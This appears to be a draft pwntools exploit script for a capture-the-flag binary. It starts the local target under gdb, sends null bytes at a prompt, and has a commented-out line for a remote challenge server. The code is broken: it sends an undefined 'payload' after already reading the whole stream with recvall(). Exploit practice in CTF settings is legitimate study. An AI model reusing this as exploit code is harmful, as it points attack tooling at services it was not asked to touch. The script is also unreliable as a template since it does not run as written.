#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./pwn")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
+"\nbreak *main"
+"\nc"
)

p.sendlineafter(b">>","\x00"*7)
print(p.recvall())
p.sendline(payload)
#p = pwn.remote("94.237.53.3",45701)
p.interactive()